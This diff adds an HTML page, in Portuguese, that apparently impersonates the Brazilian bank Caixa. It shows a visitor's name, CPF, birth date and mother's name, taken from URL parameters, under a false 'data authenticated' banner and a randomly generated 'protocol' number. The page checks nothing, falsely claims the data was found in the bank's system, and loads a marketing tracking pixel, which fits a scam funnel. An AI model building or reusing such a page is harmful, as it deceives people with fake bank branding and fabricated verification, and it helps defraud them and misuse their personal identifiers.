@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <title>Confirmação de Autenticidade - Caixa</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Montserrat', Arial, sans-serif;
+    }
+    
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
+    
+    @font-face {
+      font-family: 'FuturaBold';
+      src: url('fonts/futuraBold.eot');
+      src: url('fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+           url('fonts/futuraBold.woff') format('woff'),
+           url('fonts/futuraBold.ttf') format('truetype'),
+           url('fonts/futuraBold.svg#futuraBold') format('svg');
+      font-weight: bold;
+      font-style: normal;
+    }
+    
+    body {
+      background-color: #f8f8f8;
+      display: flex;
+      justify-content: center;
+      padding: 0rem 1rem;
+    }
+    
+    .caixa-topbar {
+      height: 5px;
+      background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+      width: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 100;
+    }
+    
+    .container {
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1.5rem 0;
+      margin-top: 5px;
+    }
+    
+    .logo {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+      margin-bottom: 1rem;
+      background-color: white;
+      padding: 10px 0;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    .logo img {
+      max-width: 110px;
+      height: auto;
+      display: block;
+    }
+    
+    .title {
+      color: #005CA9;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 0.75rem;
+      text-align: center;
+      font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif;
+    }
+    
+    .separator {
+      border: none;
+      border-top: 2px solid #005CA9;
+      width: 100%;
+      margin: 0.75rem 0 1rem;
+    }
+    
+    .main-card {
+      background-color: #F4F4F4;
+      padding: 1rem;
+      width: 100%;
+      border-radius: 6px;
+      margin-bottom: 1rem;
+      line-height: 1.4rem;
+      font-size: 0.95rem;
+      text-align: center;
+    }
+    
+    .success-badge {
+      background-color: #005CA9;
+      color: white;
+      padding: 0.5rem 1rem;
+      border-radius: 20px;
+      margin: 1rem 0;
+      font-weight: bold;
+      display: inline-block;
+    }
+    
+    .info-card {
+      background-color: #F4F4F4;
+      padding: 0.75rem 1rem;
+      margin-bottom: 0.5rem;
+      width: 100%;
+      border-radius: 6px;
+    }
+    
+    .info-card-title {
+      font-size: 0.9rem;
+      color: #333;
+      margin-bottom: 0.25rem;
+      font-weight: 500;
+    }
+    
+    .info-card-value {
+      font-weight: bold;
+      font-size: 1rem;
+      color: #005CA9;
+    }
+  </style>
+</head>
+<body>
+  <div class="caixa-topbar"></div>
+  <div class="container">
+    <div class="logo">
+      <img src="images/logo-caixa.png" alt="Logo Caixa">
+    </div>
+    <div class="title">Confirmação de Autenticidade</div>
+    <hr class="separator">
+    <div class="main-card">
+      <div class="success-badge">Dados Autenticados</div>
+      <p>
+        Os dados do(a) Sr(a). <span id="nomeCompleto" style="font-weight: bold;"></span> 
+        foram encontrados em nosso sistema e sua autenticidade foi confirmada.
+      </p>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">Nome Completo</div>
+      <div class="info-card-value" id="nomeCompletoValue"></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">CPF</div>
+      <div class="info-card-value" id="cpfValue"></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">Data de Nascimento</div>
+      <div class="info-card-value" id="nascimentoValue"></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">Nome da Mãe</div>
+      <div class="info-card-value" id="maeValue"></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">Data e Hora da Consulta</div>
+      <div class="info-card-value" id="dataConsultaValue"></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-title">Protocolo</div>
+      <div class="info-card-value" id="protocoloValue"></div>
+    </div>
+  </div>
+  <script>
+    function formatCPF(cpf) {
+      // Verifica se CPF existe e não está vazio
+      if (!cpf || cpf.trim() === '') {
+        console.log('CPF vazio ou inválido:', cpf);
+        return 'CPF não informado';
+      }
+      
+      // Remove caracteres não numéricos
+      cpf = cpf.replace(/\D/g, '');
+      
+      // Verifica se tem 11 dígitos
+      if (cpf.length !== 11) {
+        console.log('CPF com tamanho inválido:', cpf, 'Tamanho:', cpf.length);
+        return cpf; // Retorna sem formatação se inválido
+      }
+      
+      // Aplica a máscara
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function formatDateTime(date) {
+      const day = String(date.getDate()).padStart(2, '0');
+      const month = String(date.getMonth() + 1).padStart(2, '0');
+      const year = date.getFullYear();
+      const hour = String(date.getHours()).padStart(2, '0');
+      const min = String(date.getMinutes()).padStart(2, '0');
+      return `${day}/${month}/${year} ${hour}:${min}`;
+    }
+
+    function formatBirthDate(birthDate) {
+      if (!birthDate) return "";
+      // Se a data já estiver formatada, retorna ela mesma
+      if (birthDate.includes('/')) return birthDate;
+      
+      // Tenta interpretar diferentes formatos de data
+      let parts;
+      if (birthDate.includes('-')) {
+        parts = birthDate.split('-');
+        // Formato ISO: YYYY-MM-DD
+        if (parts[0].length === 4) {
+          return `${parts[2]}/${parts[1]}/${parts[0]}`;
+        }
+        // Outro formato com hífen
+        return `${parts[0]}/${parts[1]}/${parts[2]}`;
+      }
+      
+      // Formato sem separadores (Ex: 15081990)
+      if (birthDate.length === 8 && !isNaN(birthDate)) {
+        return `${birthDate.substring(0, 2)}/${birthDate.substring(2, 4)}/${birthDate.substring(4, 8)}`;
+      }
+      
+      return birthDate;
+    }
+
+    // Debug: mostrar URL atual
+    console.log('URL atual:', window.location.href);
+    console.log('Parâmetros:', window.location.search);
+
+    // Obter parâmetros da URL
+    const params = new URLSearchParams(window.location.search);
+    const nomeCompleto = params.get('name') || '';
+    const cpf = params.get('cpf') || '';
+    const dataNascimento = params.get('birthDate') || '';
+    const nomeMae = params.get('motherName') || '';
+    
+    // Debug: mostrar parâmetros capturados
+    console.log('Parâmetros capturados:');
+    console.log('- Nome:', nomeCompleto);
+    console.log('- CPF bruto:', cpf);
+    console.log('- Data Nascimento:', dataNascimento);
+    console.log('- Nome da Mãe:', nomeMae);
+    
+    // Também tentar capturar dados do localStorage como fallback
+    let dadosLocalStorage = null;
+    try {
+      const dadosUsuario = localStorage.getItem('dadosUsuario');
+      if (dadosUsuario) {
+        dadosLocalStorage = JSON.parse(dadosUsuario);
+        console.log('Dados do localStorage encontrados:', dadosLocalStorage);
+      }
+    } catch (e) {
+      console.log('Erro ao ler localStorage:', e);
+    }
+    
+    // Usar dados do localStorage como fallback se parâmetros estiverem vazios
+    const nomeParaExibir = nomeCompleto || (dadosLocalStorage?.nome) || 'Nome não informado';
+    const cpfParaExibir = cpf || (dadosLocalStorage?.cpf) || '';
+    
+    console.log('Valores finais a serem exibidos:');
+    console.log('- Nome final:', nomeParaExibir);
+    console.log('- CPF final:', cpfParaExibir);
+    
+    // Gerar protocolo aleatório
+    const protocolo = Math.floor(Math.random() * 9000000000) + 1000000000;
+    
+    // Data e hora atual
+    const now = new Date();
+    const dataConsulta = formatDateTime(now);
+    
+    // Preencher os dados na página
+    document.getElementById('nomeCompleto').textContent = nomeParaExibir;
+    document.getElementById('nomeCompletoValue').textContent = nomeParaExibir;
+    document.getElementById('cpfValue').textContent = formatCPF(cpfParaExibir);
+    document.getElementById('nascimentoValue').textContent = formatBirthDate(dataNascimento);
+    document.getElementById('maeValue').textContent = nomeMae;
+    document.getElementById('dataConsultaValue').textContent = dataConsulta;
+    document.getElementById('protocoloValue').textContent = protocolo;
+    
+    console.log('✅ Página preenchida com sucesso!');
+  </script>
+</body>
+</html> 
